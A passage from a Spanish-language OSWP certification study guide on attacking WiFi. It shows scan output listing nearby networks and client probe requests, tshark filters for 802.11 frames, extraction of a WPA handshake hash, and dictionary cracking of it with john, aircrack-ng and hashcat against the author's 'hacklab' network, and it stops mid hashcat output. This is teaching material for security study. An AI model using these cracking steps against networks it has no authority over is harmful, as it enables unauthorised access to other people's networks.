desc\u00e1rgalo desde aqu\u00ed: http://standards-oui.ieee.org/oui/oui.txt\n</code></pre> <p>Como vemos, la primera vez que lo corremos, en caso de no contar con el fichero 'oui.txt', se genera un peque\u00f1o aviso para avisar de que necesitamos descargarlo para correr el script, pues en caso contrario los datos no ser\u00e1n bien representados.</p> <p>Por tanto:</p> <ul> <li>wget http://standards-oui.ieee.org/oui/oui.txt</li> </ul> <p>Una vez hecho, ya podemos ejecutar el script, obteniendo los siguientes resultados:</p> <pre><code>\u250c\u2500[root@parrot]\u2500[/home/s4vitar/Desktop]\n\u2514\u2500\u2500\u257c #./file.sh captura-01.csv \n\nN\u00famero total de puntos de acceso: 43\nN\u00famero total de estaciones: 5\nN\u00famero total de estaciones no asociadas: 5\n\nPuntos de acceso disponibles:\n\n Invitados \n    Direcci\u00f3n MAC: 4C:96:14:2C:42:82\n    Vendor: Juniper Networks\n MiFibra-CECC \n    Direcci\u00f3n MAC: 44:FE:3B:FE:CE:CE\n    Vendor: Arcadyan Corporation\n WIFI_EXT \n    Direcci\u00f3n MAC: 4C:96:14:2C:42:86\n    Vendor: Juniper Networks\n MOVISTAR_A908 \n    Direcci\u00f3n MAC: FC:B4:E6:99:A9:09\n    Vendor: ASKEY COMPUTER CORP\n No es posible obtener el nombre de la red (ESSID)\n    Direcci\u00f3n MAC: 00:9A:CD:E7:C0:24\n    Vendor: HUAWEI TECHNOLOGIES CO.,LTD\n MiFibra-91BD \n    Direcci\u00f3n MAC: 70:4F:57:9F:9A:8B\n    Vendor: TP-LINK TECHNOLOGIES CO.,LTD.\n Interno \n    Direcci\u00f3n MAC: 4C:96:14:2C:42:80\n    Vendor: Juniper Networks\n MOVISTAR_171B \n    Direcci\u00f3n MAC: 78:29:ED:9D:17:1C\n    Vendor: ASKEY COMPUTER CORP\n JAZZTEL_1301. \n    Direcci\u00f3n MAC: 00:B6:B7:36:06:0C\n    Vendor: Informaci\u00f3n no encontrada en la base de datos\n WIFI_EXT2 \n    Direcci\u00f3n MAC: 44:48:C1:F1:97:03\n    Vendor: Hewlett Packard Enterprise\n Interno \n    Direcci\u00f3n MAC: 4C:96:14:2C:47:40\n    Vendor: Juniper Networks\n    Estaciones:\n         4C:96:14:2C:47:40 \n            Vendor: Juniper Networks\n            Redes a las que el dispositivo ha estado asociado: MAPFRE\n iMovil \n    Direcci\u00f3n MAC: 4C:96:14:27:B9:84\n    Vendor: Juniper Networks\n MOVISTAR_9E71 \n    Direcci\u00f3n MAC: 94:91:7F:0E:9E:72\n    Vendor: ASKEY COMPUTER CORP\n MiFibra-7BB4 \n    Direcci\u00f3n MAC: 94:6A:B0:60:7B:B6\n    Vendor: Arcadyan Corporation\n MOVISTAR_D8C1 \n    Direcci\u00f3n MAC: 1C:B0:44:50:D8:C2\n    Vendor: ASKEY COMPUTER CORP\n MiFibra-226A \n    Direcci\u00f3n MAC: 94:6A:B0:9B:22:6C\n    Vendor: Arcadyan Corporation\n MOVISTAR_4DE8 \n    Direcci\u00f3n MAC: 78:29:ED:22:4D:E9\n    Vendor: ASKEY COMPUTER CORP\n Interno \n    Direcci\u00f3n MAC: 4C:96:14:27:B9:80\n    Vendor: Juniper Networks\n WIFI_EXT \n    Direcci\u00f3n MAC: 4C:96:14:27:B9:86\n    Vendor: Juniper Networks\n Invitados \n    Direcci\u00f3n MAC: A8:D0:E5:C1:C9:42\n    Vendor: Juniper Networks\n iMovil \n    Direcci\u00f3n MAC: A8:D0:E5:C1:C9:44\n    Vendor: Juniper Networks\n Invitados \n    Direcci\u00f3n MAC: 4C:96:14:27:B9:82\n    Vendor: Juniper Networks\n WIFI_EXT \n    Direcci\u00f3n MAC: 4C:96:14:2C:47:46\n    Vendor: Juniper Networks\n Interno \n    Direcci\u00f3n MAC: A8:D0:E5:C1:C9:40\n    Vendor: Juniper Networks\n vodafone18AC \n    Direcci\u00f3n MAC: 24:DF:6A:10:18:B4\n    Vendor: HUAWEI TECHNOLOGIES CO.,LTD\n MOVISTAR_3126 \n    Direcci\u00f3n MAC: CC:D4:A1:0C:31:28\n    Vendor: MitraStar Technology Corp.\n WIFI_EXT \n    Direcci\u00f3n MAC: A8:D0:E5:C1:C9:46\n    Vendor: Juniper Networks\n Orange-A238 \n    Direcci\u00f3n MAC: 50:7E:5D:2F:A2:3A\n    Vendor: Arcadyan Technology Corporation\n MOVISTAR_1083 \n    Direcci\u00f3n MAC: F8:8E:85:43:10:84\n    Vendor: Comtrend Corporation\n MIWIFI_2G_2Xhs \n    Direcci\u00f3n MAC: E4:CA:12:96:21:FE\n    Vendor: zte corporation\n Interno2 \n    Direcci\u00f3n MAC: 44:48:C1:F1:96:A0\n    Vendor: Hewlett Packard Enterprise\n WLAN_4A4C \n    Direcci\u00f3n MAC: 00:1A:2B:AC:0B:CF\n    Vendor: Ayecom Technology Co., Ltd.\n iMovil2 \n    Direcci\u00f3n MAC: 44:48:C1:F1:96:A4\n    Vendor: Hewlett Packard Enterprise\n MOVISTAR_2F95 \n    Direcci\u00f3n MAC: E8:D1:1B:21:2F:96\n    Vendor: ASKEY COMPUTER CORP\n MOVISTAR_5A18 \n    Direcci\u00f3n MAC: A4:2B:B0:FB:90:D1\n    Vendor: TP-LINK TECHNOLOGIES CO.,LTD.\n WIFI_EXT2 \n    Direcci\u00f3n MAC: 44:48:C1:F1:96:A3\n    Vendor: Hewlett Packard Enterprise\n No es posible obtener el nombre de la red (ESSID)\n    Direcci\u00f3n MAC: 44:48:C1:F1:96:A1\n    Vendor: Hewlett Packard Enterprise\n VILLACRISIS \n    Direcci\u00f3n MAC: 84:16:F9:5B:45:B8\n    Vendor: TP-LINK TECHNOLOGIES CO.,LTD.\n No es posible obtener el nombre de la red (ESSID)\n    Direcci\u00f3n MAC: 44:48:C1:F1:96:A2\n    Vendor: Hewlett Packard Enterprise\n MOVISTAR_4C30 \n    Direcci\u00f3n MAC: E2:41:36:08:4C:30\n    Vendor: Informaci\u00f3n no encontrada en la base de datos\n TP-LINK_79D4 \n    Direcci\u00f3n MAC: D4:6E:0E:F8:79:D4\n    Vendor: TP-LINK TECHNOLOGIES CO.,LTD.\n MOVISTAR_1677 \n    Direcci\u00f3n MAC: 1C:B0:44:D4:16:78\n    Vendor: ASKEY COMPUTER CORP\n No es posible obtener el nombre de la red (ESSID)\n    Direcci\u00f3n MAC: 4C:1B:86:02:54:EA\n    Vendor: Arcadyan Corporation\n\nEstaciones no asociadas:\n\n 34:12:F9:77:49:5E \n    Vendor: HUAWEI TECHNOLOGIES CO.,LTD\n    Es probable que se trate de un dispositivo m\u00f3vil\n    Redes a las que el dispositivo ha estado asociado: BUY&amp;RECICLE\n 00:24:2B:BC:4E:57 \n    Vendor: Hon Hai Precision Ind. Co.,Ltd.\n    Redes a las que el dispositivo ha estado asociado: MAPFRE\n 10:44:00:9C:76:66 \n    Vendor: HUAWEI TECHNOLOGIES CO.,LTD\n    Es probable que se trate de un dispositivo m\u00f3vil\n 4C:96:14:2C:47:40 \n    Vendor: Juniper Networks\n    Redes a las que el dispositivo ha estado asociado: MAPFRE\n AC:D1:B8:17:91:C0 \n    Vendor: Hon Hai Precision Ind. Co.,Ltd.\n</code></pre> <p>\u00a1Qu\u00e9 belleza!, de bastante utilidad incluso para visualizar los paquetes Probe Request, contemplando las redes a las que el cliente ha estado conectado en el pasado, pudiendo as\u00ed posteriormente efectuar un ataque de tipo Evil Twin, que veremos m\u00e1s adelante.</p>"},{"location":"Seguridad/Preparaci%C3%B3n%20OSWP/#analisis-de-paquetes-de-red-con-tshark","title":"An\u00e1lisis de paquetes de red con tshark","text":"<p>Hasta ahora hemos estado viendo diversos modos de filtro con tshark pero sin dedicar una secci\u00f3n espec\u00edfica para los modos de filtro. A continuaci\u00f3n, vamos a ver distintos modos de filtrado, de utilidad para el an\u00e1lisis de paquetes y capturas:</p> <ul> <li>Paquetes Probe Request</li> </ul> <pre><code>\u250c\u2500[root@parrot]\u2500[/home/s4vitar/Desktop/Red]\n\u2514\u2500\u2500\u257c #tshark -i wlan0mon -Y \"wlan.fc.type_subtype==4\" 2&gt;/dev/null\n  175 22.140053472 JuniperN_2c:47:40 \u2192 Broadcast    802.11 178 Probe Request, SN=2376, FN=0, Flags=........C, SSID=WLAN_C311\n  185 26.153075819 Apple_ed:e2:63 \u2192 Broadcast    802.11 214 Probe Request, SN=1959, FN=0, Flags=........C, SSID=Wlan1\n  186 26.234864238 Apple_ed:e2:63 \u2192 Broadcast    802.11 214 Probe Request, SN=1963, FN=0, Flags=........C, SSID=Wlan1\n  187 26.245021241 Apple_ed:e2:63 \u2192 Broadcast    802.11 214 Probe Request, SN=1964, FN=0, Flags=........C, SSID=Wlan1\n  188 26.257907684 Apple_ed:e2:63 \u2192 Broadcast    802.11 214 Probe Request, SN=1965, FN=0, Flags=........C, SSID=Wlan1\n  189 26.268055504 Apple_ed:e2:63 \u2192 Broadcast    802.11 214 Probe Request, SN=1966, FN=0, Flags=........C, SSID=Wlan1\n</code></pre> <ul> <li>Paquetes Probe Response</li> </ul> <pre><code>\u250c\u2500[root@parrot]\u2500[/home/s4vitar/Desktop/Red]\n\u2514\u2500\u2500\u257c #tshark -r Captura-01.cap -Y \"wlan.fc.type_subtype==5\" 2&gt;/dev/null\n    2   1.617473 XiaomiCo_b1:c5:53 \u2192 32:7d:a9:4f:21:99 802.11 229 Probe Response, SN=1872, FN=0, Flags=........, BI=100, SSID=hacklab\n    5   1.628735 XiaomiCo_b1:c5:53 \u2192 32:7d:a9:4f:21:99 802.11 229 Probe Response, SN=1874, FN=0, Flags=........, BI=100, SSID=hacklab\n   10   3.698368 XiaomiCo_b1:c5:53 \u2192 IntelCor_46:d1:38 802.11 210 Probe Response, SN=2340, FN=0, Flags=........, BI=100, SSID=hacklab\n   12   3.701951 XiaomiCo_b1:c5:53 \u2192 IntelCor_46:d1:38 802.11 210 Probe Response, SN=2341, FN=0, Flags=........, BI=100, SSID=hacklab\n   14   3.756735 XiaomiCo_b1:c5:53 \u2192 IntelCor_46:d1:38 802.11 210 Probe Response, SN=2342, FN=0, Flags=........, BI=100, SSID=hacklab\n   16   3.759295 XiaomiCo_b1:c5:53 \u2192 IntelCor_46:d1:38 802.11 210 Probe Response, SN=2343, FN=0, Flags=........, BI=100, SSID=hacklab\n</code></pre> <ul> <li>Paquetes Association Request</li> </ul> <pre><code>\u250c\u2500[root@parrot]\u2500[/home/s4vitar/Desktop/Red]\n\u2514\u2500\u2500\u257c #tshark -r Captura-01.cap -Y \"wlan.fc.type_subtype==0\" 2&gt;/dev/null\n   22   5.041479 IntelCor_46:d1:38 \u2192 XiaomiCo_b1:c5:53 802.11 122 Association Request, SN=227, FN=0, Flags=........, SSID=hacklab\n</code></pre> <ul> <li>Paquetes Association Response</li> </ul> <pre><code>\u250c\u2500[root@parrot]\u2500[/home/s4vitar/Desktop/Red]\n\u2514\u2500\u2500\u257c #tshark -r Captura-01.cap -Y \"wlan.fc.type_subtype==1\" 2&gt;/dev/null\n   24   5.049663 XiaomiCo_b1:c5:53 \u2192 IntelCor_46:d1:38 802.11 127 Association Response, SN=2346, FN=0, Flags=........\n</code></pre> <ul> <li>Paquetes Beacon</li> </ul> <pre><code>\u250c\u2500[root@parrot]\u2500[/home/s4vitar/Desktop/Red]\n\u2514\u2500\u2500\u257c #tshark -r Captura-01.cap -Y \"wlan.fc.type_subtype==8\" 2&gt;/dev/null\n    1   0.000000 XiaomiCo_b1:c5:53 \u2192 Broadcast    802.11 239 Beacon frame, SN=1855, FN=0, Flags=........, BI=100, SSID=hacklab\n</code></pre> <ul> <li>Paquete Authentication</li> </ul> <pre><code>\u250c\u2500[root@parrot]\u2500[/home/s4vitar/Desktop/Red]\n\u2514\u2500\u2500\u257c #tshark -r Captura-01.cap -Y \"wlan.fc.type_subtype==11\" 2&gt;/dev/null\n   18   5.033280 IntelCor_46:d1:38 \u2192 XiaomiCo_b1:c5:53 802.11 30 Authentication, SN=226, FN=0, Flags=........\n   20   5.035840 XiaomiCo_b1:c5:53 \u2192 IntelCor_46:d1:38 802.11 30 Authentication, SN=2344, FN=0, Flags=........\n</code></pre> <ul> <li>Paquetes Deauthentication</li> </ul> <pre><code>\u250c\u2500[root@parrot]\u2500[/home/s4vitar/Desktop/Red]\n\u2514\u2500\u2500\u257c #tshark -i wlan0mon -Y \"wlan.fc.type_subtype==12\" 2&gt;/dev/null\n  200 39.994017471 AskeyCom_d4:16:78 \u2192 Broadcast    802.11 38 Deauthentication, SN=0, FN=0, Flags=........\n  201 39.994777432 AskeyCom_d4:16:78 \u2192 Broadcast    802.11 39 Deauthentication, SN=0, FN=0, Flags=........\n  202 39.996199413    Broadcast \u2192 AskeyCom_d4:16:78 802.11 38 Deauthentication, SN=1, FN=0, Flags=........\n  203 39.996798243    Broadcast \u2192 AskeyCom_d4:16:78 802.11 39 Deauthentication, SN=1, FN=0, Flags=........\n  205 39.999554640 AskeyCom_d4:16:78 \u2192 Broadcast    802.11 38 Deauthentication, SN=2, FN=0, Flags=........\n  206 40.000174666 AskeyCom_d4:16:78 \u2192 Broadcast    802.11 39 Deauthentication, SN=2, FN=0, Flags=........\n</code></pre> <ul> <li>Paquetes Dissasociation</li> </ul> <pre><code>tshark -i wlan0mon -Y \"wlan.fc.type_subtype==10\" 2&gt;/dev/null # Para este caso no pude pillar ninguno jeje\n</code></pre> <ul> <li>Paquetes Clear To Send (CTS)</li> </ul> <pre><code>\u250c\u2500[\u2717]\u2500[root@parrot]\u2500[/home/s4vitar/Desktop/Red]\n\u2514\u2500\u2500\u257c #tshark -i wlan0mon -Y \"wlan.fc.type_subtype==28\" 2&gt;/dev/null\n  183 11.333769733              \u2192 XiaomiCo_b1:c5:53 (20:34:fb:b1:c5:53) (RA) 802.11 70 Clear-to-send, Flags=........C\n  186 11.334796342              \u2192 XiaomiCo_b1:c5:53 (20:34:fb:b1:c5:53) (RA) 802.11 70 Clear-to-send, Flags=........C\n  189 11.336432358              \u2192 XiaomiCo_b1:c5:53 (20:34:fb:b1:c5:53) (RA) 802.11 70 Clear-to-send, Flags=........C\n  192 11.339134653              \u2192 XiaomiCo_b1:c5:53 (20:34:fb:b1:c5:53) (RA) 802.11 70 Clear-to-send, Flags=........C\n  196 11.352502740              \u2192 XiaomiCo_b1:c5:53 (20:34:fb:b1:c5:53) (RA) 802.11 70 Clear-to-send, Flags=........C\n  199 11.357122880              \u2192 XiaomiCo_b1:c5:53 (20:34:fb:b1:c5:53) (RA) 802.11 70 Clear-to-send, Flags=........C\n  204 11.362841524              \u2192 XiaomiCo_b1:c5:53 (20:34:fb:b1:c5:53) (RA) 802.11 70 Clear-to-send, Flags=........C\n  222 11.418923972              \u2192 AskeyCom_d4:16:78 (1c:b0:44:d4:16:78) (RA) 802.11 70 Clear-to-send, Flags=........C\n  224 11.419977797              \u2192 AskeyCom_d4:16:78 (1c:b0:44:d4:16:78) (RA) 802.11 70 Clear-to-send, Flags=........C\n  226 11.427114234              \u2192 AskeyCom_d4:16:78 (1c:b0:44:d4:16:78) (RA) 802.11 70 Clear-to-send, Flags=........C\n  230 11.427645439              \u2192 AskeyCom_d4:16:78 (1c:b0:44:d4:16:78) (RA) 802.11 70 Clear-to-send, Flags=........C\n  235 11.430118052              \u2192 XiaomiCo_b1:c5:53 (20:34:fb:b1:c5:53) (RA) 802.11 70 Clear-to-send, Flags=........C\n  240 11.434558344              \u2192 XiaomiCo_b1:c5:53 (20:34:fb:b1:c5:53) (RA) 802.11 70 Clear-to-send, Flags=........C\n  243 11.435567660              \u2192 XiaomiCo_b1:c5:53 (20:34:fb:b1:c5:53) (RA) 802.11 70 Clear-to-send, Flags=........C\n  246 11.441881524              \u2192 XiaomiCo_b1:c5:53 (20:34:fb:b1:c5:53) (RA) 802.11 70 Clear-to-send, Flags=........C\n</code></pre> <ul> <li>Paquetes ACK</li> </ul> <pre><code>\u250c\u2500[root@parrot]\u2500[/home/s4vitar/Desktop/Red]\n\u2514\u2500\u2500\u257c #tshark -i wlan0mon -Y \"wlan.fc.type_subtype==29\" 2&gt;/dev/null\n   44 2.532918866              \u2192 XiaomiCo_d0:51:c5 (a4:50:46:d0:51:c5) (RA) 802.11 70 Acknowledgement, Flags=........C\n  213 4.870822127              \u2192 72:4f:56:d5:f4:21 (72:4f:56:d5:f4:21) (RA) 802.11 70 Acknowledgement, Flags=........C\n  214 4.872287210              \u2192 72:4f:56:27:f7:f5 (72:4f:56:27:f7:f5) (RA) 802.11 70 Acknowledgement, Flags=........C\n  215 4.873060680              \u2192 72:4f:56:d5:f4:21 (72:4f:56:d5:f4:21) (RA) 802.11 70 Acknowledgement, Flags=........C\n  231 5.792287268              \u2192 Pegatron_5b:42:f6 (38:60:77:5b:42:f6) (RA) 802.11 70 Acknowledgement, Flags=........C\n  252 6.105136504              \u2192 Apple_24:f9:60 (70:14:a6:24:f9:60) (RA) 802.11 70 Acknowledgement, Flags=........C\n  254 6.109740279              \u2192 HewlettP_f1:96:a3 (44:48:c1:f1:96:a3) (RA) 802.11 70 Acknowledgement, Flags=........C\n  268 6.137270470              \u2192 Apple_24:f9:60 (70:14:a6:24:f9:60) (RA) 802.11 70 Acknowledgement, Flags=........C\n  279 6.161518783              \u2192 Apple_24:f9:60 (70:14:a6:24:f9:60) (RA) 802.11 70 Acknowledgement, Flags=........C\n  281 6.165512928              \u2192 Apple_24:f9:60 (70:14:a6:24:f9:60) (RA) 802.11 70 Acknowledgement, Flags=........C\n</code></pre>"},{"location":"Seguridad/Preparaci%C3%B3n%20OSWP/#extraccion-del-hash-en-el-handshake","title":"Extracci\u00f3n del Hash en el Handshake","text":"<p>Aunque no es necesario, por si queremos saber con qu\u00e9 estamos trabajando, es posible extraer el Hash correspondiente a la captura donde se encuentra nuestro Handshake.</p> <p>Qu\u00e9 mejor que ver nuestro Handshake representado en formato Hash, tanto que hemos hablado de \u00e9l como para no prestarle un poco m\u00e1s de atenci\u00f3n. Actualmente, aircrack-ng cuenta con el par\u00e1metro '-J', de utilidad para generar un archivo de '.hccap'.</p> <p>\u00bfPor qu\u00e9 queremos generar un archivo HCCAP?, porque luego a trav\u00e9s de la herramienta hccap2john podemos transformar ese archivo a un hash, igual que como har\u00edamos como ssh2john u otra utilidad semejante.</p> <p>Por tanto, aqu\u00ed una demostraci\u00f3n:</p> <pre><code>\u250c\u2500[root@parrot]\u2500[/home/s4vitar/Desktop/Red]\n\u2514\u2500\u2500\u257c #ls\nCaptura-01.cap\n\u250c\u2500[root@parrot]\u2500[/home/s4vitar/Desktop/Red]\n\u2514\u2500\u2500\u257c #aircrack-ng -J miCaptura Captura-01.cap \nOpening Captura-01.cape wait...\nRead 5110 packets.\n\n   #  BSSID              ESSID                     Encryption\n\n   1  20:34:FB:B1:C5:53  hacklab                   WPA (1 handshake)\n\nChoosing first network as target.\n\nOpening Captura-01.cape wait...\nRead 5110 packets.\n\n1 potential targets\n\n\n\nBuilding Hashcat file...\n\n[*] ESSID (length: 7): hacklab\n[*] Key version: 2\n[*] BSSID: 20:34:FB:B1:C5:53\n[*] STA: 34:41:5D:46:D1:38\n[*] anonce:\n    FE AD BB C5 CA AC 3C 41 52 56 B1 44 5D 61 29 2A \n    72 E1 7D 73 6A 5E 16 A5 15 88 E4 9E 58 42 EC 78 \n[*] snonce:\n    47 5D 5A 50 E4 2D 1D 18 F8 67 5B 0A B6 B1 FF 1F \n    6A 85 82 EC 66 3E 92 2A F0 CC B2 05 F3 8B DE E0 \n[*] Key MIC:\n    0C 0E B7 91 69 C1 FE FD E5 D9 08 42 2E E4 A5 3C\n[*] eapol:\n    01 03 00 75 02 01 0A 00 00 00 00 00 00 00 00 00 \n    01 47 5D 5A 50 E4 2D 1D 18 F8 67 5B 0A B6 B1 FF \n    1F 6A 85 82 EC 66 3E 92 2A F0 CC B2 05 F3 8B DE \n    E0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 \n    00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 \n    00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 \n    00 00 16 30 14 01 00 00 0F AC 04 01 00 00 0F AC \n    04 01 00 00 0F AC 02 00 00 \n\nSuccessfully written to miCaptura.hccap\n\n\u250c\u2500[root@parrot]\u2500[/home/s4vitar/Desktop/Red]\n\u2514\u2500\u2500\u257c #ls\nCaptura-01.cap  miCaptura.hccap\n</code></pre> <p>Una vez hecho, hacemos uso de hccap2john para visualizar el hash:</p> <pre><code>\u250c\u2500[root@parrot]\u2500[/home/s4vitar/Desktop/Red]\n\u2514\u2500\u2500\u257c #hccap2john miCaptura.hccap &gt; miHash\n\u250c\u2500[\u2717]\u2500[root@parrot]\u2500[/home/s4vitar/Desktop/Red]\n\u2514\u2500\u2500\u257c #cat !$\ncat miHash\nhacklab:$WPAPSK$hacklab#61HvgQJHB23RFh2sFppOICEh5FXsNpg8hf5z5qe3UilaDd6ewAmm/TC9ri1yfPj3mekwEJ7KgIFRMGYeQi3xQqdS3eIJWCGSK29gS.21.5I0.Ec............/FppOICEh5FXsNpg8hf5z5qe3UilaDd6ewAmm/TC9ri..................................................................3X.I.E..1uk2.E..1uk2.E..1uk0....................................................................................................................................................................................../t.....U....kCht3dkTvxtRY6EWvYdHk:34-41-5d-46-d1-38:20-34-fb-b1-c5-53:2034fbb1c553::WPA2:miCaptura.hccap\n</code></pre> <p>Y eso tan bonito que vemos, es el Hash correspondiente a la contrase\u00f1a de la red WiFi, la cual podr\u00edamos sencillamente crackear llegados hasta este punto haciendo uso de la herramienta John junto a un diccionario.</p>"},{"location":"Seguridad/Preparaci%C3%B3n%20OSWP/#fuerza-bruta-con-john","title":"Fuerza bruta con John","text":"<p>Ya habiendo llegado hasta aqu\u00ed, procedemos con los ataques de fuerza bruta. Aprovechando el punto anteriormente visto, ya que contamos con un Hash... resulta sencillo crackear la contrase\u00f1a de la red WiFi haciendo uso de un diccionario a trav\u00e9s de la herramienta John, de la siguiente forma:</p> <pre><code>\u250c\u2500[root@parrot]\u2500[/home/s4vitar/Desktop/Red]\n\u2514\u2500\u2500\u257c #john --wordlist=/usr/share/wordlists/rockyou.txt miHash --format=wpapsk\nUsing default input encoding: UTF-8\nLoaded 1 password hash (wpapsk, WPA/WPA2/PMF/PMKID PSK [PBKDF2-SHA1 256/256 AVX2 8x])\nNo password hashes left to crack (see FAQ)\n\u250c\u2500[root@parrot]\u2500[/home/s4vitar/Desktop/Red]\n\u2514\u2500\u2500\u257c #john --show --format=wpapsk miHash \nhacklab:vampress1:34-41-5d-46-d1-38:20-34-fb-b1-c5-53:2034fbb1c553::WPA2:miCaptura.hccap\n\n1 password hash cracked, 0 left\n\u250c\u2500[root@parrot]\u2500[/home/s4vitar/Desktop/Red]\n\u2514\u2500\u2500\u257c #echo \"Password: $(john --show --format=wpapsk miHash | cut -d ':' -f 2)\"\nPassword: vampress1\n</code></pre> <p>Y ah\u00ed dispondr\u00edamos de la contrase\u00f1a de la red inal\u00e1mbrica, que en este caso es vampress1.</p>"},{"location":"Seguridad/Preparaci%C3%B3n%20OSWP/#fuerza-bruta-con-aircrack","title":"Fuerza bruta con Aircrack","text":"<p>Para crackear nuestro Handshake desde la propia suite de aircrack, tan s\u00f3lo tendr\u00edamos que emplear esta sintaxis:</p> <ul> <li>aircrack-ng -w rutaDiccionario Captura-01.cap</li> </ul> <p>Se iniciar\u00eda el proceso de fuerza bruta y una vez obtenida se detendr\u00eda la fase de cracking, mostrando la contrase\u00f1a siempre y cuando esta se encuentre en el diccionario especificado:</p> <pre><code>                              Aircrack-ng 1.5.2 \n\n      [00:00:43] 487370/9822769 keys tested (7440.27 k/s) \n\n      Time left: 20 minutes, 54 seconds                          4.96%\n\n                           KEY FOUND! [ vampress1 ]\n\n\n      Master Key     : 9C E8 4E 94 F4 08 12 AC 1F 06 C9 5F CF C8 DE D5 \n                       EC 70 5C 4B 73 FE 52 7B 02 29 9F 9A 88 E2 B3 74 \n\n      Transient Key  : C6 21 8D E8 62 DD B2 A7 48 65 52 AA E0 C0 8E 85 \n                       1B 63 D0 1D 9C C0 47 12 DA BF E1 63 12 01 8C 75 \n                       D3 EF AE C5 E4 62 B7 C7 6E DE D1 05 9D 67 81 BF \n                       E7 94 71 D0 8D FE 92 17 61 AC 44 BA 48 E6 F7 B3 \n\n      EAPOL HMAC     : 1A EB 42 13 85 E4 A1 FC 99 AF AA 97 4D AA EE 25\n</code></pre> <p>La velocidad de c\u00f3mputo siempre va a depender de nuestra CPU, pero veremos un par de t\u00e9cnicas m\u00e1s adelante para aumentar nuestra velocidad de c\u00f3mputo, superando las 10 millones de contrase\u00f1as por segundo.</p>"},{"location":"Seguridad/Preparaci%C3%B3n%20OSWP/#fuerza-bruta-con-hashcat","title":"Fuerza bruta con Hashcat","text":"<p>Ya que aircrack no es capaz de tirar por GPU, en caso de que teng\u00e1is una GPU como en mi caso:</p> <pre><code>\u250c\u2500[root@parrot]\u2500[/home/s4vitar/Desktop/Red]\n\u2514\u2500\u2500\u257c #nvidia-detect \nDetected NVIDIA GPUs:\n01:00.0 VGA compatible controller [0300]: NVIDIA Corporation GP107M [GeForce GTX 1050 Mobile] [10de:1c8d] (rev a1)\n</code></pre> <p>Lo mejor es tirar de Hashcat para estos casos. Para correr la herramienta, primero necesitamos saber cu\u00e1l es el m\u00e9todo num\u00e9rico correspondiente a WPA:</p> <pre><code>\u250c\u2500[root@parrot]\u2500[/home/s4vitar/Desktop/Red]\n\u2514\u2500\u2500\u257c #hashcat -h | grep -i wpa\n   2500 | WPA-EAPOL-PBKDF2                                 | Network Protocols\n   2501 | WPA-EAPOL-PMK                                    | Network Protocols\n  16800 | WPA-PMKID-PBKDF2                                 | Network Protocols\n  16801 | WPA-PMKID-PMK                                    | Network Protocols\n</code></pre> <p>Una vez identificado (2500), lo primero que necesitamos hacer es convertir nuestra captura '.cap' a un archivo de tipo '.hccapx', espec\u00edfico para la combinaci\u00f3n de Hashcat. Para ello, corremos el par\u00e1metro '-j' de aircrack (esta vez es min\u00fascula):</p> <pre><code>\u250c\u2500[root@parrot]\u2500[/home/s4vitar/Desktop/Red]\n\u2514\u2500\u2500\u257c #aircrack-ng -j hashcatCapture Captura-01.cap \nOpening Captura-01.cape wait...\nRead 5110 packets.\n\n   #  BSSID              ESSID                     Encryption\n\n   1  20:34:FB:B1:C5:53  hacklab                   WPA (1 handshake)\n\nChoosing first network as target.\n\nOpening Captura-01.cape wait...\nRead 5110 packets.\n\n1 potential targets\n\n\n\nBuilding Hashcat (3.60+) file...\n\n[*] ESSID (length: 7): hacklab\n[*] Key version: 2\n[*] BSSID: 20:34:FB:B1:C5:53\n[*] STA: 34:41:5D:46:D1:38\n[*] anonce:\n    FE AD BB C5 CA AC 3C 41 52 56 B1 44 5D 61 29 2A \n    72 E1 7D 73 6A 5E 16 A5 15 88 E4 9E 58 42 EC 78 \n[*] snonce:\n    47 5D 5A 50 E4 2D 1D 18 F8 67 5B 0A B6 B1 FF 1F \n    6A 85 82 EC 66 3E 92 2A F0 CC B2 05 F3 8B DE E0 \n[*] Key MIC:\n    0C 0E B7 91 69 C1 FE FD E5 D9 08 42 2E E4 A5 3C\n[*] eapol:\n    01 03 00 75 02 01 0A 00 00 00 00 00 00 00 00 00 \n    01 47 5D 5A 50 E4 2D 1D 18 F8 67 5B 0A B6 B1 FF \n    1F 6A 85 82 EC 66 3E 92 2A F0 CC B2 05 F3 8B DE \n    E0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 \n    00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 \n    00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 \n    00 00 16 30 14 01 00 00 0F AC 04 01 00 00 0F AC \n    04 01 00 00 0F AC 02 00 00 \n\nSuccessfully written to hashcatCapture.hccapx\n\n\u250c\u2500[root@parrot]\u2500[/home/s4vitar/Desktop/Red]\n\u2514\u2500\u2500\u257c #ls\nCaptura-01.cap  hashcatCapture.hccapx\n</code></pre> <p>Ya en posesi\u00f3n de esta captura, iniciamos la fase de cracking haciendo uso de la siguiente sintaxis:</p> <ul> <li>hashcat -m 2500 -d 1 rockyou.txt --force -w 3</li> </ul> <p>Obteniendo los siguientes resultados en un tiempo r\u00e9cord:</p> <pre><code>\u250c\u2500[\u2717]\u2500[root@parrot]\u2500[/usr/share/wordlists]\n\u2514\u2500\u2500\u257c #hashcat -m 2500 -d 1 hashcatCapture.hccapx rockyou.txt \nhashcat (v5.1.0) starting...\n\nOpenCL Platform #1: NVIDIA Corporation\n======================================\n* Device #1: GeForce GTX 1050, 1010/4040 MB allocatable, 5MCU\n\nOpenCL Platform #2: The pocl project\n====================================\n* Device #2: pthread-Intel(R) Core(TM) i7-7700HQ CPU @ 2.80GHz, skipped.\n\nHashes: 1 digests; 1 unique digests, 1 unique salts\nBitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates\nRules: 1\n\nApplicable optimizers:\n* Zero-Byte\n* Single-Hash\n* Single-Salt\n* Slow-Hash-SIMD-LOOP\n\nMinimum password length supported by kernel: 8\nMaximum password length supported by kernel: 63\n\nWatchdog: Temperature abort trigger set to 90c\n\n* Device #1: build_opts '-cl-std=CL1.2 -I OpenCL -I /usr/share/hashcat/OpenCL -D LOCAL_MEM_TYPE=1 -D VENDOR_ID=32 -D CUDA_ARCH=601 -D AMD_ROCM=0 -D VECT_SIZE=1 -D DEVICE_TYPE=4 -D DGST_R0=0 -D DGST_R1=1 -D DGST_R2=2 -D DGST_R3=3 -D DGST_ELEM=4 -D KERN_TYPE=2500 -D _unroll'\nDictionary cache hit:\n* Filename..: rockyou.txt\n* Passwords.: 14344386\n* Bytes.....: 139921517\n* Keyspace..: 